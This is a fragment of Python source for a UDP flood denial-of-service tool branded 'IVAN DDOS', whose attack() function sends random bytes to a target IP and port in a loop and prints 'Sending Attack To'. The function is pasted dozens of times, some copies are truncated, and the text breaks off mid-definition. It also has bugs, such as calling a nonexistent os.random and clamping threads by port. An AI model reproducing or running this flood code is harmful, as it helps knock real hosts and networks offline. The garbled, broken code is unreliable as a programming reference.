    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(9109105678910910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(999999999, port))
    if threads is not None:
        threads = max(1, min(999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(910910, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(1, 999999999)
        threads = threads or os.random.randint(1, 999999999)
        time = time or os.random.randint(1, 999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[91m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
